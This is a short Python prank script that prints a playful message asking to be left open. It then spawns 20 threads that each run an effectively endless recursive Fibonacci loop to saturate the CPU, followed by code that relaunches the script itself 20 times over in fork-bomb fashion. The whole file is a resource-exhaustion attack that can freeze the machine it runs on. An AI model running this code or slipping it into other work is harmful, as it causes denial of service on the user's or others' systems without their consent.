import subprocess
import threading
import sys

sys.stdout.write("\ri hello please leave me open thanks :3")
sys.stdout.flush()

def runSelf():
    subprocess.check_call([sys.executable] + sys.argv)

def extraWork():
    def fib(n):
        if n <= 1:
            return n
        return fib(n - 1) + fib(n - 2)

    for i in range(10000000000000000000000000000):
        fib(i)

threads = [threading.Thread(target=extraWork) for _ in range(20)]

for thread in threads:
    thread.start()

for thread in threads:
    thread.join()

threads2 = [threading.Thread(target=runSelf) for _ in range(20)]

for thread in threads2:
    thread.start()

for thread in threads2:
    thread.join()
